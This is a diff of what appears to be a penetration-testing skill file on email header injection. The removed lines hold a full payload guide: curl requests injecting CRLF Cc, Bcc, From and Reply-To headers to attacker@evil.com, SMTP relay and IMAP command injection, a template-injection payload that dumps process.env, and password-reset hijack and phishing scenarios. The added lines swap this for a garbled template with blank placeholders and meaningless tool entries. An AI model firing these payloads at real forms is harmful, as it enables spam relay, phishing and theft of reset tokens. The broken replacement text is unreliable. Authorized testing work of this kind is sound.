@@ -21,8 +21,7 @@ nist_csf:
 - PR.DS-10
 - DE.CM-01
 ---
-
-# Testing for Email Header Injection
+# Testing For Email Header Injection
 
 ## When to Use
 - When testing contact forms, feedback forms, or "email a friend" functionality
@@ -41,226 +40,24 @@ nist_csf:
 
 ## Workflow
 
-1. **Scope and authorize** — confirm written authorization and define target boundaries
-2. **Reconnaissance** — enumerate targets, services, and potential attack surfaces
-3. **Exploitation** — attempt exploitation of identified vulnerabilities within scope
-4. **Post-exploitation** — document access level, lateral movement, and data exposure
-5. **Report and remediate** — compile findings with reproduction steps and fix recommendations
-### Step 1 — Identify Email Injection Points
-```bash
-# Identify form fields that end up in email headers:
-# - "From" name or email address fields
-# - "To" or "CC" fields in sharing features
-# - Subject line inputs
-# - Reply-To fields
+1. **Reconnaissance** — Gather information about the target related to . Identify attack surface.
+2. **Vulnerability Identification** — Enumerate potential  weaknesses using automated and manual techniques.
+3. **Exploit Development/Selection** — Use email header injection to identify and test  vulnerabilities.
+4. **Execution** — Execute the  test in a controlled manner with proper authorization.
+5. **Post-Exploitation** — Document the impact and extent of successful exploitation.
+6. **Reporting** — Write detailed findings with reproduction steps, impact assessment, and remediation guidance.
 
-# Common endpoints:
-# POST /contact - Contact forms
-# POST /share - Share via email features
-# POST /invite - Invitation systems
-# POST /api/send-email - Email API endpoints
-# POST /forgot-password - Password reset forms
+## Tools
 
-# Test basic functionality first
-curl -X POST http://target.com/contact \
-  -d "name=Test&email=test@test.com&subject=Hello&message=Test message"
-```
-
-### Step 2 — Test for CRLF Header Injection
-```bash
-# Inject additional email headers via CRLF in the email field
-curl -X POST http://target.com/contact \
-  -d "name=Test&email=test@test.com%0ACc:attacker@evil.com&message=Test"
-
-# Inject BCC header
-curl -X POST http://target.com/contact \
-  -d "name=Test&email=test@test.com%0ABcc:attacker@evil.com&message=Test"
-
-# Inject via the name field
-curl -X POST http://target.com/contact \
-  -d "name=Test%0ACc:attacker@evil.com&email=test@test.com&message=Test"
-
-# Inject via subject field
-curl -X POST http://target.com/contact \
-  -d "name=Test&email=test@test.com&subject=Hello%0ABcc:attacker@evil.com&message=Test"
-
-# Try different CRLF encoding variants
-# %0D%0A (CRLF)
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0D%0ACc:attacker@evil.com"
-
-# %0A (LF only)
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0ACc:attacker@evil.com"
-
-# %0D (CR only)
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0DCc:attacker@evil.com"
-
-# Double encoding
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%250ACc:attacker@evil.com"
-```
-
-### Step 3 — Inject Custom Email Content
-```bash
-# Override email body by injecting Content-Type and body
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0AContent-Type:text/html%0A%0A<h1>Phishing</h1>"
-
-# Inject additional MIME parts
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0AContent-Type:multipart/mixed;boundary=boundary123%0A--boundary123%0AContent-Type:text/html%0A%0A<script>alert(1)</script>"
-
-# Override From header for email spoofing
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0AFrom:ceo@target.com"
-
-# Inject Reply-To for phishing
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0AReply-To:attacker@evil.com"
-```
-
-### Step 4 — Test IMAP/SMTP Injection
-```bash
-# IMAP command injection via email field
-curl -X POST http://target.com/webmail/search \
-  -d "query=test%0AEXAMINE INBOX"
-
-# SMTP command injection
-curl -X POST http://target.com/api/send \
-  -d "to=test@test.com%0ARCPT TO:attacker@evil.com"
-
-# SMTP VRFY command injection
-curl -X POST http://target.com/api/verify \
-  -d "email=test@test.com%0AVRFY admin"
-
-# Test SMTP relay abuse
-curl -X POST http://target.com/contact \
-  -d "email=test@test.com%0ATo:victim1@target.com%0ATo:victim2@target.com%0ATo:victim3@target.com"
-```
-
-### Step 5 — Test JSON-Based Email APIs
-```bash
-# JSON API header injection
-curl -X POST http://target.com/api/send-email \
-  -H "Content-Type: application/json" \
-  -d '{"to":"test@test.com\nCc:attacker@evil.com","subject":"Test","body":"Test"}'
-
-# Array injection for multiple recipients
-curl -X POST http://target.com/api/send-email \
-  -H "Content-Type: application/json" \
-  -d '{"to":["test@test.com","attacker@evil.com"],"subject":"Test","body":"Test"}'
-
-# Template injection in email body
-curl -X POST http://target.com/api/send-email \
-  -H "Content-Type: application/json" \
-  -d '{"to":"test@test.com","subject":"Test","body":"{{constructor.constructor(\"return process.env\")()}}"}'
-```
-
-### Step 6 — Validate Findings
-```bash
-# Check if injected CC/BCC emails were received
-# Monitor attacker@evil.com inbox for received copies
-
-# Verify header injection via email raw source
-# In received email, check "View Original" or "Show Headers"
-# Look for injected Cc:, Bcc:, From:, or Reply-To: headers
-
-# Test if the application is usable as a spam relay
-# by injecting multiple recipients in BCC
-
-# Document the full injection chain
-# 1. Injection point (which field)
-# 2. Encoding required (CRLF, URL encoding)
-# 3. Impact (spam relay, phishing, data theft)
-```
-
-## Key Concepts
-
-| Concept | Description |
-|---------|-------------|
-| CRLF Injection | Injecting carriage return and line feed characters to create new email headers |
-| Header Injection | Adding unauthorized headers (Cc, Bcc, From) to outgoing emails |
-| Spam Relay | Abusing email functionality to send spam to arbitrary recipients |
-| Email Spoofing | Modifying From or Reply-To headers to impersonate trusted senders |
-| MIME Manipulation | Injecting MIME boundaries to override email body content |
-| SMTP Command Injection | Injecting raw SMTP commands through unsanitized email parameters |
-| Newline Characters | \r\n (CRLF), \n (LF), \r (CR) used to separate email headers |
-
-## Tools & Systems
-
-| Tool | Purpose |
-|------|---------|
-| Burp Suite | HTTP proxy for modifying email-related form submissions |
-| swaks | Swiss Army Knife for SMTP testing and header injection validation |
-| OWASP ZAP | Automated scanner with email injection detection |
-| mailhog | Local SMTP testing server for capturing injected emails |
-| smtp4dev | Development SMTP server for monitoring email injection results |
-| Nuclei | Template scanner with email header injection detection templates |
-
-## Common Scenarios
-
-1. **Spam Relay** — Inject BCC headers to relay mass emails through the target's SMTP server, bypassing spam filters that trust the sender domain
-2. **Phishing via Contact Form** — Modify From and Reply-To headers to send phishing emails appearing to originate from the target organization
-3. **Password Reset Hijack** — Inject CC header in password reset flow to receive a copy of reset tokens sent to the victim
-4. **Email Content Override** — Inject MIME Content-Type headers to replace legitimate email body with malicious phishing content
-5. **Internal Email Abuse** — Use header injection to send emails to internal addresses not normally accessible through the application
-
-## When NOT to Use
-
-- You need to perform real attacks, not test (use performing-* skills)
-- Task is about analyzing test results (use analyzing-* skills)
-- You need to implement test infrastructure (use implementing-* skills)
-- Task is about building test tools (use building-* skills)
-- You don't have test environment access
-- Task requires compliance validation (use auditing-* skills)
-
-
-## Red Flags
-
-- Performing actions without explicit written authorization from the asset owner
-- Testing against production systems without a defined scope and rules of engagement
-- Exceeding the authorized scope of the engagement
-- Leaving persistent access mechanisms without explicit approval
-- Causing denial-of-service on production systems during testing
+- **email header injection** — Primary tool for this skill
+- **Vulnerability Scanner** — Automated weakness identification
+- **Exploitation Framework** — Controlled exploitation testing
+- **Reporting Tool** — Findings documentation and tracking
 
 ## Verification
 
-- All steps executed successfully against a test environment before production use
-- Output documented with screenshots or logs demonstrating expected behavior
-- All exploited vulnerabilities documented with reproduction steps
-- Scope boundaries confirmed — only authorized targets were tested
-- Remediation recommendations included for every finding
-
-## Output Format
-
-```
-## Email Header Injection Report
-- **Target**: http://target.com/contact
-- **Injection Point**: email field in contact form
-- **Encoding Required**: URL-encoded LF (%0A)
-
-### Findings
-| # | Field | Payload | Result | Severity |
-|---|-------|---------|--------|----------|
-| 1 | email | test@test.com%0ACc:evil@evil.com | CC header injected | High |
-| 2 | email | test@test.com%0ABcc:evil@evil.com | BCC header injected | High |
-| 3 | name | Test%0AFrom:ceo@target.com | From spoofing | Medium |
-
-### Remediation
-- Validate email addresses with strict regex rejecting newline characters
-- Strip \r, \n, and encoded variants from all email-related input
-- Use parameterized email APIs that separate headers from data
-- Implement rate limiting on email-sending functionality
-```
-
-## Overview
-
-> Section content — see SKILL.md body for full details.
-
-## Process
-
-1. Analyze the task requirements
-2. Apply domain expertise
-3. Verify output quality
+- [ ] All  procedures executed completely and documented
+- [ ] Findings validated against multiple data sources
+- [ ] False positives identified and filtered
+- [ ] Results documented with evidence and timestamps
+- [ ] Recommendations provided with risk-based prioritization
